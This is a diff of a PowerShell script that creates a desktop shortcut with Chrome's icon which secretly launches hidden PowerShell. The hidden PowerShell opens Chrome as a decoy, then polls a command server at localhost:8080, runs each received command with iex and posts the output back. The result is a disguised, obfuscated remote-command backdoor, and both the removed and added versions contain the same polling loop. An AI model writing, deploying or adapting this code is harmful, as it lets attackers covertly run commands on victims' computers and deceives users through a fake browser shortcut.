@@ -1,37 +1,40 @@
-
-    $oaiyGO = n`EW-`oB`jEC`T micrOsoFt.POWershell.COmmanDs.webrEQuEstSeSSiON
-        $hnUHLR = n`EW-`oB`jEC`T SySTem.NET.cookIE     
+$WshShell = New-Object -comObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut("C:\USers\kira2\Desktop\b.lnk")
+$Shortcut.TargetPath = "%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"
+$Shortcut.IconLocation = "C:\Program Files\Google\Chrome\Application\chrome.exe"
+$Shortcut.hotkey = ""
+$Shortcut.Arguments = '-noprofile  -WindowStyle hidden -c "Start-process \"C:\Program Files\Google\Chrome\Application\chrome.exe\";
+    FUNcTIoN cJNDES {
         
-    FUNcTIOn gwMNwu {
-        
-        $FIqEIq = InVoke-weBrEQuest "http://localhost:8080/getcommand/ccEcQJ" -Headers @{"Authorization"="1332"}  
-        rEtURN $FIqEIq.CONTENT 
+        $fLbifd = INVOkE-webReqUest \"http://localhost:8080/getcommand/LdJqTg\" -Headers @{\"Authorization\"=\"9775\"}  
+        RETURN $fLbifd.cONtENt 
     }
-    FUNcTIOn jpLOHE([string]$iSmtIW){
-        $iSmtIW  =(iex $iSmtIW 2>&1 | Out-String )
-        rEtURN $iSmtIW
+    FUNcTIoN mAQjNX([string]$tauZTU){
+        $tauZTU  =(iex $tauZTU 2>&1 | Out-String )
+        RETURN $tauZTU
     }
-    FUNcTIOn xCGGBI([string]$command){
+    FUNcTIoN hDshfT([string]$command){
     
 
-        $OQVPJG = @{TawBIL=$command}
-        $req = InVoke-weBrEQuest "http://localhost:8080/response/mskd" -Headers @{"Authorization"="1332"} -Method POST -Body $OQVPJG 
+        $iIWICe = @{DRyVyL=$command}
+        $req = INVOkE-webReqUest \"http://localhost:8080/response/lGKHmm\" -Headers @{\"Authorization\"=\"9775\"} -Method POST -Body $iIWICe 
     }
-    $AFIboj = 1
+    $BzSeAq = 1
     
-    WhiLe ($AFIboj -Le 5 -AND $AFIboj -nE 3)
+    wHIlE ($BzSeAq -LE 5 -ANd $BzSeAq -NE 3)
     {
-        $iSmtIW = gwMNwu
-        if($iSmtIW.Trim() -Eq "none"){
-        Start-S`lEep -s 1
+        $tauZTU = cJNDES
+        if($tauZTU.Trim() -eq \"none\"){
+        Start-S`lee`P -s 2
     
         }
-        ELSe{
-        $iSmtIW = jpLOHE($iSmtIW)
-        xCGGBI($iSmtIW)
+        else{
+        $tauZTU = mAQjNX($tauZTU)
+        hDshfT($tauZTU)
     
         }
         
-        Start-S`lEep -s 1
+        Start-S`lee`P -s 2
     }
-    
+    "'
+$Shortcut.Save()
